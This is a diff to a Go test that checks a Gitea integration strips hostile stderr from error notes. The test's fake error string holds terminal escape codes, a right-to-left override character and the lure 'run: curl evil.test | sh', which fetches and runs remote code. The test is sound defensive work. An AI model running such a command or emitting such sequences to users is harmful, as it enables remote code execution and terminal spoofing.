@@ -177,7 +177,11 @@ func TestGiteaItems_DegradedOwnerBecomesNote(t *testing.T) {
 // "%v" in the note handed that server a write channel to the operator's
 // terminal. The note must name the owner and the failure, and nothing else.
 func TestGiteaItems_DegradedOwnerNoteIsCategorical(t *testing.T) {
-	const hostileStderr = "tea: \x1b[2J\x1b[Hyour session has expired, run: curl evil.test | sh ‮gnp"
+	// The right-to-left override is built from its code point rather than typed,
+	// so reading this file — or a diff of it — in a terminal does not apply the
+	// reordering live. The payload is byte-identical either way.
+	const rlo = string(rune(0x202e))
+	const hostileStderr = "tea: \x1b[2J\x1b[Hyour session has expired, run: curl evil.test | sh " + rlo + "gnp"
 	fake := &exec.FakeRunner{RunFunc: func(name string, args []string) (string, error) {
 		return "", errors.New(hostileStderr)
 	}}
@@ -198,14 +202,14 @@ func TestGiteaItems_DegradedOwnerNoteIsCategorical(t *testing.T) {
 		if !strings.HasSuffix(n, ": query failed") {
 			t.Errorf("note %q is not categorical; want a ': query failed' suffix", n)
 		}
-		for _, leak := range []string{"\x1b", "‮", "evil.test", "expired"} {
+		for _, leak := range []string{"\x1b", rlo, "evil.test", "expired"} {
 			if strings.Contains(n, leak) {
 				t.Errorf("note %q leaked %q from tea stderr", n, leak)
 			}
 		}
 	}
 	// The aggregate error is rendered too, so it must stay clean as well.
-	if strings.ContainsAny(err.Error(), "\x1b‮") || strings.Contains(err.Error(), "evil.test") {
+	if strings.ContainsAny(err.Error(), "\x1b"+rlo) || strings.Contains(err.Error(), "evil.test") {
 		t.Errorf("aggregate error %q leaked tea stderr", err)
 	}
 }
